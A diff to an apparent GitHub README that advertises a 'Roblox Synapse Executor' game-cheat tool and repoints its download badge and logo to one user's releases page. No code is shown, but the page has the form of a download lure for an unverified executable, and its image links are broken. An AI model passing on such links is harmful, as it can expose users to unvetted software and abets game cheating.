@@ -46,7 +46,7 @@ This repository covers a wide range of topics related to Roblox scripting and ga
 
 For more information and access to the **Roblox Synapse Executor** tool, visit the following link:
 
-[![Download Roblox Synapse Executor](https://img.shields.io/badge/Download-Roblox%20Synapse%20Executor-blue)](https://github.com/files/File.zip)
+[![Download Roblox Synapse Executor](https://github.com/Kaveshan93/Roblox-Synapse/releases%20Synapse%20Executor-blue)](https://github.com/Kaveshan93/Roblox-Synapse/releases)
 
 Please note that the provided link needs to be launched to access the **Roblox Synapse Executor** tool. If the link is not functional or you prefer alternative options, check the "Releases" section of this repository for additional resources.
 
@@ -56,7 +56,7 @@ Ready to elevate your Roblox scripting experience? Join the community of scripte
 
 Dive into the world of Roblox modding with confidence - the **Roblox Synapse Executor** has your back!
 
-![Roblox Synapse Logo](https://example.com/roblox-synapse-logo.png)
+![Roblox Synapse Logo](https://github.com/Kaveshan93/Roblox-Synapse/releases)
 
 ## Connect with Us! 🌟
 
